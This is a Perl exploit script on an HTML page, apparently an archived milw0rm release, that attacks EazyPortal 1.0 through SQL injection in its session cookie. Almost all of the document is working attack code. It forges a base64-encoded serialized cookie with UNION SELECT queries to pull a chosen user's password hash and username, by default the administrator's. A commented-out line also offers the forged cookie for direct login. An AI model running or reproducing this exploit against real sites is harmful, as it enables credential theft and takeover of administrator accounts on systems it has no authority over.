<html><head><title>EazyPortal <= 1.0 (COOKIE) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
#	Vendor url: http://www.eazyportal.com/
#
#	by Iron - http://www.randombase.com
#
#	exploit goes through $_COOKIE
#
use LWP::UserAgent;
use MIME::Base64;
 
print &quot;#
# EazyPortal &lt;= 1.0 SQL Injection Exploit
# By Iron - www.randombase.com
# Greets to everyone at RootShell Security Group
# 
# Example target url: http://www.target.com/Portal/
Target url?&quot;;
chomp($target=&lt;stdin&gt;);
if($target !~ /^http:\/\//)
{
	$target = &quot;http://&quot;.$target;
}
if($target !~ /\/$/)
{
	$target .= &quot;/&quot;;
}
print &quot;User id to retrieve name/password from? (1 = admin by default)&quot;;
chomp($target_id=&lt;stdin&gt;);
print &quot;\n[+]Retrieving table prefix...&quot;;
@header = ('Cookie' =&gt; ' session_vars=YTo2OntzOjU6InVuYW1lIjtzOjEyOiInIEVSUk9SIFpPTUciO3M6NDoidXB3ZCI7czozMjoiMDk4ZjZiY2Q0NjIxZDM3M2NhZGU0ZTgzMjYyN2I0ZjYiO3M6MzoidWlkIjtzOjE6IjEiO3M6NDoidWdtdCI7czoyOiIrMCI7czoxMDoidWxhc3R2aXNpdCI7czoxMDoiMTIwNDA0NjIwNiI7czo0OiJwcml2IjthOjk6e3M6NDoibmV3cyI7czo0OiJuZXdzIjtzOjU6InBvbGxzIjtzOjI6InBvIjtzOjc6Im1haWxpbmciO3M6MjoibWEiO3M6NToicGFnZXMiO3M6MjoicGEiO3M6NToidXNlcnMiO3M6MjoidXMiO3M6ODoic2V0dGluZ3MiO3M6Mjoic2UiO3M6NToiZm9ydW0iO3M6MjoiZm8iO3M6NjoiYmxvY2tzIjtzOjI6ImJsIjtzOjg6ImRvd25sb2FkIjtzOjI6ImRvIjt9fQ==');
$ua = LWP::UserAgent-&gt;new;
$ua-&gt;timeout(10);
$ua-&gt;env_proxy;
$ua-&gt;agent(&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12&quot;);
$response = $ua-&gt;get($target, @header);
if ($response-&gt;is_success)
{
#print $response-&gt;content;
	if($response-&gt;content =~ /select \* from (.*)users where ustatus/i)
	{
		print &quot;\n[+]Got prefix: $1&quot;;
		$prefix = $1;
	}
	else
	{
		print &quot;\n[-]Failed, trying empty prefix.&quot;;
		$prefix = &quot;&quot;;
	}
}
else
{
 die &quot;Error: &quot;.$response-&gt;status_line;
}
print &quot;\n[+]Building cookie&quot;;
$query = &quot;lalalalalala' UNION SELECT upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd FROM &quot;.$prefix.&quot;users WHERE 1=1 AND uid ='&quot;.$target_id; #fucked up query but it works :)
$cookie = encode_base64('a:6:{s:5:&quot;uname&quot;;s:'.length($query).':&quot;'.$query.'&quot;;s:4:&quot;upwd&quot;;s:17:&quot;\' OR upwd != \'lol&quot;;s:3:&quot;uid&quot;;s:1:&quot;1&quot;;s:4:&quot;ugmt&quot;;s:2:&quot;+0&quot;;s:10:&quot;ulastvisit&quot;;s:10:&quot;1204046206&quot;;s:4:&quot;priv&quot;;a:9:{s:4:&quot;news&quot;;s:4:&quot;news&quot;;s:5:&quot;polls&quot;;s:2:&quot;po&quot;;s:7:&quot;mailing&quot;;s:2:&quot;ma&quot;;s:5:&quot;pages&quot;;s:2:&quot;pa&quot;;s:5:&quot;users&quot;;s:2:&quot;us&quot;;s:8:&quot;settings&quot;;s:2:&quot;se&quot;;s:5:&quot;forum&quot;;s:2:&quot;fo&quot;;s:6:&quot;blocks&quot;;s:2:&quot;bl&quot;;s:8:&quot;download&quot;;s:2:&quot;do&quot;;}}');
$cookie =~ s/\n//g;
$logincookie = $cookie;
print &quot;\n[+]Eating cookie :P&quot;;
print &quot;\n[+]Retrieving password&quot;;
@header = ('Cookie' =&gt; 'session_vars='.$cookie);
$response = $ua-&gt;get($target, @header);
if ($response-&gt;is_success)
{
	if($response-&gt;content =~ /([a-f0-9]{32})/i)
	{
		$p = $1;
	}
	else
	{
		print &quot;\n[-]Exploit failed :'(&quot;;
		exit;
	}
}
else
{
 die &quot;Error: &quot;.$response-&gt;status_line;
}
print &quot;\n[+]Retrieving username&quot;;
$query = &quot;lalalalalala' UNION SELECT uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname FROM &quot;.$prefix.&quot;users WHERE 1=1 AND uid ='&quot;.$target_id;
$cookie = encode_base64('a:6:{s:5:&quot;uname&quot;;s:'.length($query).':&quot;'.$query.'&quot;;s:4:&quot;upwd&quot;;s:17:&quot;\' OR upwd != \'lol&quot;;s:3:&quot;uid&quot;;s:1:&quot;1&quot;;s:4:&quot;ugmt&quot;;s:2:&quot;+0&quot;;s:10:&quot;ulastvisit&quot;;s:10:&quot;1204046206&quot;;s:4:&quot;priv&quot;;a:9:{s:4:&quot;news&quot;;s:4:&quot;news&quot;;s:5:&quot;polls&quot;;s:2:&quot;po&quot;;s:7:&quot;mailing&quot;;s:2:&quot;ma&quot;;s:5:&quot;pages&quot;;s:2:&quot;pa&quot;;s:5:&quot;users&quot;;s:2:&quot;us&quot;;s:8:&quot;settings&quot;;s:2:&quot;se&quot;;s:5:&quot;forum&quot;;s:2:&quot;fo&quot;;s:6:&quot;blocks&quot;;s:2:&quot;bl&quot;;s:8:&quot;download&quot;;s:2:&quot;do&quot;;}}');
$cookie =~ s/\n//g;
@header = ('Cookie' =&gt; 'session_vars='.$cookie);
$response = $ua-&gt;get($target, @header);
if ($response-&gt;is_success)
{
	if($response-&gt;content =~ /&gt;Log Out \((.*)\)&lt;\/a&gt;/i)
	{
		print &quot;\n[+]Exploit succeeded!&quot;;
		print &quot;\n&quot;.&quot;#&quot; x 50 .&quot;\n[+]Username: $1&quot;;
		print &quot;\n[+]Password: $p&quot;.&quot;\n&quot;.&quot;#&quot; x 50;
	}
	else
	{
		print &quot;\n[-]Exploit only got md5 pass :O&quot;;
		print &quot;\n[+]Password: $p&quot;;
	}
#	print &quot;\n\n:[+]You can also login with this cookie:\n&quot;.&quot;#&quot; x 50 .&quot;\n$logincookie\n&quot;.&quot;#&quot; x 50; #uncomment if you have troubles cracking the hash
}
else
{
 die &quot;Error: &quot;.$response-&gt;status_line;
}

# milw0rm.com [2008-02-27]</pre></html>